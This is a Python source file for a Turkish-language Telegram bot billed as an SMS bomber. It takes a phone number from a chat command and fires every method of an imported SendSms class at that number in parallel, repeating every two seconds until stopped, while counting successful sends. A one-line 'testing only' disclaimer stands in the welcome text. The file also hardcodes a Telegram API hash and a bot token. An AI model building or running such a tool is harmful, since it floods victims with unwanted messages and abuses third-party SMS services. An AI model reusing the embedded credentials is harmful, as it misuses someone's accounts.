# telethon_smsbomber.py

from telethon import TelegramClient, events
from sms import SendSms
import asyncio
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
import logging

# ——————————————————————
#  Telegram API bilgileri
# ——————————————————————
api_id    = 23350184
api_hash  = "41f0c2a157268e158f91ab7d59f4fc19"
bot_token = "7107604320:AAEcx_S-aa8IwW8PiOWcAdNm_dAX0EczFX4"

# ——————————————————————
#  Log ayarları: konsolda detaylı bilgi
# ——————————————————————
logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] %(levelname)s - %(message)s',
    datefmt='%H:%M:%S'
)

# Bot başlat
client = TelegramClient('smsbomber_bot', api_id, api_hash).start(bot_token=bot_token)

# Global task ve sayaç depoları
active_tasks  = {}  # user_id → asyncio.Task
status_counts = {}  # user_id → {'basarili': int, 'basarisiz': int}
executor      = ThreadPoolExecutor(max_workers=50)


# ——————————————————————
#  /start → Hoş geldin & komutlar
# ——————————————————————
@client.on(events.NewMessage(pattern='/start'))
async def start_handler(event):
    await event.respond(
        "**🚀 Capi SMS Bomber’a Hoş Geldin!**\n\n"
        "Bu bot, `sms.py` içindeki servislerle SMS bombardımanı yapar.\n\n"
        "**Komutlar:**\n"
        "📲 `/sms <telefon>` — Bombardımanı başlat\n"
        "⛔ `/stop` — Durdur\n"
        "ℹ️ `/help` — Yardım menüsü\n"
        "🔧 `/servisler` — Toplam servis sayısı\n\n"
        "_⚠️ Sadece test içindir, etik kurallara uy._",
        parse_mode='markdown'
    )


# ——————————————————————
#  /help → Yardım menüsü
# ——————————————————————
@client.on(events.NewMessage(pattern='/help'))
async def help_handler(event):
    await event.respond(
        "**📘 Yardım Menüsü**\n\n"
        "`/sms <telefon>` — SMS bombardımanı başlatır\n"
        "`/stop` — Aktif bombardımanı durdurur\n"
        "`/servisler` — Toplam servisi gösterir\n"
        "`/start` — Hoş geldin mesajı tekrar gösterir"
    )


# ——————————————————————
#  /servisler → Servis sayısını göster
# ——————————————————————
@client.on(events.NewMessage(pattern='/servisler'))
async def service_count_handler(event):
    dummy = SendSms("0000000000", "")
    count = len([
        m for m in dir(SendSms)
        if callable(getattr(dummy, m)) and not m.startswith("__")
    ])
    await event.respond(f"Mevcut servis sayısı: **{count}** adet", parse_mode='markdown')


# ——————————————————————
#  /sms 1234567890 → Bombardımanı başlat
# ——————————————————————
@client.on(events.NewMessage(pattern=r'/sms (\d{10})'))
async def sms_handler(event):
    user_id = event.chat_id
    phone   = event.pattern_match.group(1)

    # Sayaçları sıfırla
    status_counts[user_id] = {"basarili": 0, "basarisiz": 0}

    # Başlama onayı
    await event.respond(f"Başlatılıyor: `0{phone}`", parse_mode='markdown')
    logging.info(f"{user_id} için SMS bombardımanı başladı: 0{phone}")

    # Servis fonksiyonlarını dinamik olarak al
    send_sms = SendSms(phone, "")
    services = [
        getattr(send_sms, fn)
        for fn in dir(SendSms)
        if callable(getattr(send_sms, fn)) and not fn.startswith("__")
    ]

    # Durum mesajı (sonra editlenecek)
    status_msg = await event.respond("```\n╔════════════════════════╗\n"
                                     "║ Durum bilgisi yükleniyor ║\n"
                                     "╚════════════════════════╝\n```")

    # Spam coroutine
    async def spam():
        try:
            while user_id in active_tasks:
                loop = asyncio.get_event_loop()
                futures = [loop.run_in_executor(executor, svc) for svc in services]
                results = await asyncio.gather(*futures, return_exceptions=True)

                # Sonuçları sayaçlara ekle
                for r in results:
                    if isinstance(r, Exception):
                        status_counts[user_id]["basarisiz"] += 1
                    else:
                        status_counts[user_id]["basarili"] += 1

                # Metin kutusunu yeniden oluştur
                text = (
                    "______________________\n"
                    f"Başarılı   [{status_counts[user_id]['basarili']:^5}]\n"
                    f"Başarısız  [{status_counts[user_id]['basarisiz']:^5}]\n"
                    f"Su ana kadar başarılı yollanan mesaj [{status_counts[user_id]['basarili']:^5}]\n"
                    "______________________"
                )
                # Edit işlem
                await status_msg.edit(text, parse_mode=None)

                # Konsola da logla
                logging.info(f"0{phone} → ✔️{status_counts[user_id]['basarili']}, ❌{status_counts[user_id]['basarisiz']}")

                await asyncio.sleep(2)

        except asyncio.CancelledError:
            logging.info(f"{user_id} bombardımanı iptal etti.")

    # Task başlat ve kaydet
    task = asyncio.create_task(spam())
    active_tasks[user_id] = task


# ——————————————————————
#  /stop → Bombardımanı durdur
# ——————————————————————
@client.on(events.NewMessage(pattern='/stop'))
async def stop_handler(event):
    user_id = event.chat_id
    task = active_tasks.pop(user_id, None)
    if task:
        task.cancel()
        await event.respond("⛔ SMS bombardımanı durduruldu.")
        logging.info(f"{user_id} bombardımanı durdurdu.")
    else:
        await event.respond("❗ Hiçbir işlem aktif değil.")


# ——————————————————————
#  Botu başlat
# ——————————————————————
if __name__ == "__main__":
    client.run_until_disconnected()